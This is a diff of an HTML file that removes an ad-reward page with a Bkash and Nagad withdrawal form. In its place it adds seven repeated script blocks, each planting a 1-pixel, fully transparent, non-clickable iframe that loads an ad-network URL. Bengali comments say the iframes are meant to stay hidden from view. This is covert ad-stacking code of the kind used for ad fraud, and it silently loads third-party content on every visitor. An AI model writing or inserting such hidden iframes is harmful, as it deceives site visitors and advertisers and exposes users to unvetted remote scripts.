@@ -1,185 +1,245 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ad Reward System</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #121212;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
-        .container {
-            text-align: center;
-            background: #1f1f1f;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
-            width: 300px;
-        }
-        .container h1 {
-            font-size: 20px;
-            color: green;
-            margin-bottom: 10px;
-        }
-        .developer {
-            font-size: 12px;
-            background-color: green;
-            padding: 5px 10px;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            display: inline-block;
-            cursor: pointer;
-        }
-        .stats {
-            margin: 10px 0;
-        }
-        .stats p {
-            margin: 5px 0;
-            font-size: 14px;
-        }
-        .progress-circle {
-            width: 80px;
-            height: 80px;
-            border: 4px solid green;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 10px auto;
-        }
-        .progress-circle span {
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .buttons button {
-            width: 90%;
-            margin: 5px 0;
-            padding: 10px;
-            font-size: 14px;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            background: green;
-            cursor: pointer;
-        }
-        .buttons button:hover {
-            background: darkorange;
-        }
-        .withdraw-section {
-            margin-top: 20px;
-            display: none;
-            padding: 20px;
-            background-color: #2a2a2a;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
-        }
-        .withdraw-section input, .withdraw-section select {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 5px;
-            border: 2px solid #555;
-            background-color: #333;
-            color: #fff;
-        }
-        .withdraw-section input:focus, .withdraw-section select:focus {
-            border-color: green;
-            outline: none;
-        }
-        .withdraw-section button {
-            background-color: green;
-            width: 100%;
-            padding: 12px;
-            font-size: 16px;
-            margin-top: 15px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .withdraw-section button:hover {
-            background-color: #006400;
-        }
-        #withdraw-status {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        .user-info {
-            margin: 10px 0;
-        }
-        .user-info p {
-            font-size: 14px;
-            margin: 5px 0;
-        }
+<script>
 
-        /* Ad styling */
-        .ad-container {
-            margin: 20px 0;
-            width: 100%;
-            text-align: center;
-        }
+    // iframe তৈরি করা হচ্ছে
 
-        .ad-container iframe {
-            width: 100%;
-            height: 250px;
-            border: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Auto MoneTag Ads</h1>
-        <div class="developer" onclick="window.location.href='../external.html?link=https://t.me/SafiRahman5'">Developer by Safi Rahman</div>
-        
-        <!-- Display User Info -->
-        <div class="user-info">
-            <p>Welcome, <span id="user-name"></span></p>
-        </div>
+    var iframe = document.createElement('iframe');
 
-        <div class="stats">
-            <p>Watched Ads: <span id="watched-ads">0</span></p>
-            <p>Earned Points: <span id="earned-points">0</span></p>
-        </div>
-        <div class="progress-circle">
-            <span id="ads-progress">0%</span>
-        </div>
-        <div class="buttons">
-            <button id="watch-ad-btn" onclick="watchAd()">Watch Ad</button>
-            <button id="auto-ad-btn" onclick="startAutoAds()">Auto Show Ads</button>
-            <button id="stop-auto-btn" onclick="stopAutoAds()">Stop Auto Ads</button>
-            <button id="withdraw-btn" onclick="showWithdrawForm()">Withdraw</button>
-        </div>
+    
 
-        <!-- Adsterra Ad Code Integration -->
-        <div class="ad-container">
-            <iframe src="https://pl25416079.profitablecpmrate.com/02/62/1f/02621f9d2e52630d639944f4631630a1.js"></iframe>
-        </div>
+    // iframe-এর URL সেট
 
-        <!-- Withdraw Section -->
-        <div class="withdraw-section" id="withdraw-section">
-            <h3 style="color: orange; margin-bottom: 15px;">Withdrawal Request</h3>
-            <input type="number" id="withdraw-amount" placeholder="Enter Points to Withdraw" />
-            <select id="payment-method">
-                <option value="bkash">Bkash</option>
-                <option value="nagad">Nagad</option>
-                <option value="manual">Manual</option>
-            </select>
-            <input type="text" id="withdraw-phone" placeholder="Enter Phone Number" />
-            <button onclick="withdrawPoints()">Withdraw</button>
-            <p id="withdraw-status"></p>
-        </div>
-    </div>
+    iframe.src = "https://www.profitablecpmratenetwork.com/mzq27ji6p?key=f281286cdf2da355b3fe8139079f221d"; // এখানে তোমার লিংক দিন
 
-    <script>
-        // Your existing script logic here...
-    </script>
-</body>
-</html>
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
+<script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://www.profitablecpmratenetwork.com/pdq7gi1uw?key=772e124db93db921bf6505f4eee2366f"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
+<script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://encyclopediainsoluble.com/aft9i5xex?key=ed051fada2d7527ee9494a506efdd784"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
+  <script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://www.profitablecpmratenetwork.com/mzq27ji6p?key=f281286cdf2da355b3fe8139079f221d"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
+<script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://www.profitablecpmratenetwork.com/pdq7gi1uw?key=772e124db93db921bf6505f4eee2366f"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
+<script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://encyclopediainsoluble.com/aft9i5xex?key=ed051fada2d7527ee9494a506efdd784"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
+  <script>
+
+    // iframe তৈরি করা হচ্ছে
+
+    var iframe = document.createElement('iframe');
+
+    
+
+    // iframe-এর URL সেট
+
+    iframe.src = "https://www.profitablecpmratenetwork.com/pcmuw5amd?key=c14266b9be247c950c975ea78cdef9ca"; // এখানে তোমার লিংক দিন
+
+    // iframe লুকানো রাখা
+
+    iframe.style.width = "1px";
+
+    iframe.style.height = "1px";
+
+    iframe.style.position = "absolute";
+
+    iframe.style.top = "0";
+
+    iframe.style.left = "0";
+
+    iframe.style.border = "0";
+
+    iframe.style.opacity = "0";          // চোখে না দেখানোর জন্য
+
+    iframe.style.pointerEvents = "none"; // click/hover এ কোন প্রভাব হবে না
+
+    // body-তে iframe যোগ করা
+
+    document.body.appendChild(iframe);
+
+  </script>
